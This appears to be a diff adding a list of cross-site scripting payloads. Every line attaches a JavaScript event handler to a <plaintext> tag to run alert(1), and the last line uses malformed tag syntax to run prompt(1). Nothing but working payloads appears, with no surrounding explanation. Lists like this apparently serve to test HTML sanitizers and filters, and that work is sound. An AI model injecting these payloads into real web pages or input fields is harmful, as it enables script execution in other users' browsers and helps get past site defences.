@@ -1,0 +1,44 @@
+<plaintext draggable="true" ondrag="alert(1)">test</plaintext>
+<plaintext draggable="true" ondragend="alert(1)">test</plaintext>
+<plaintext draggable="true" ondragenter="alert(1)">test</plaintext>
+<plaintext draggable="true" ondragleave="alert(1)">test</plaintext>
+<plaintext draggable="true" ondragstart="alert(1)">test</plaintext>
+<plaintext id=x tabindex=1 onactivate=alert(1)></plaintext>
+<plaintext id=x tabindex=1 onbeforeactivate=alert(1)></plaintext>
+<plaintext id=x tabindex=1 onbeforedeactivate=alert(1)></plaintext><input autofocus>
+<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>
+<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>
+<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>
+<plaintext onafterscriptexecute=alert(1)><script>1</script>
+<plaintext onbeforecopy="alert(1)" contenteditable>test</plaintext>
+<plaintext onbeforecut="alert(1)" contenteditable>test</plaintext>
+<plaintext onbeforepaste="alert(1)" contenteditable>test</plaintext>
+<plaintext onbeforescriptexecute=alert(1)><script>1</script>
+<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>
+<plaintext onclick="alert(1)">test</plaintext>
+<plaintext oncontextmenu="alert(1)">test</plaintext>
+<plaintext oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<plaintext oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<plaintext ondblclick="alert(1)" autofocus tabindex=1>test</plaintext>
+<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>
+<plaintext onkeydown="alert(1)" contenteditable>test</plaintext>
+<plaintext onkeypress="alert(1)" contenteditable>test</plaintext>
+<plaintext onkeyup="alert(1)" contenteditable>test</plaintext>
+<plaintext onmousedown="alert(1)">test</plaintext>
+<plaintext onmouseenter="alert(1)">test</plaintext>
+<plaintext onmouseleave="alert(1)">test</plaintext>
+<plaintext onmousemove="alert(1)">test</plaintext>
+<plaintext onmouseout="alert(1)">test</plaintext>
+<plaintext onmouseover="alert(1)">test</plaintext>
+<plaintext onmouseup="alert(1)">test</plaintext>
+<plaintext onmousewheel=alert(1)>requires scrolling
+<plaintext onpaste="alert(1)" contenteditable>test</plaintext>
+<plaintext onpointerdown=alert(1)>XSS</plaintext>
+<plaintext onpointerenter=alert(1)>XSS</plaintext>
+<plaintext onpointerleave=alert(1)>XSS</plaintext>
+<plaintext onpointermove=alert(1)>XSS</plaintext>
+<plaintext onpointerout=alert(1)>XSS</plaintext>
+<plaintext onpointerover=alert(1)>XSS</plaintext>
+<plaintext onpointerrawupdate=alert(1)>XSS</plaintext>
+<plaintext onpointerup=alert(1)>XSS</plaintext>
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
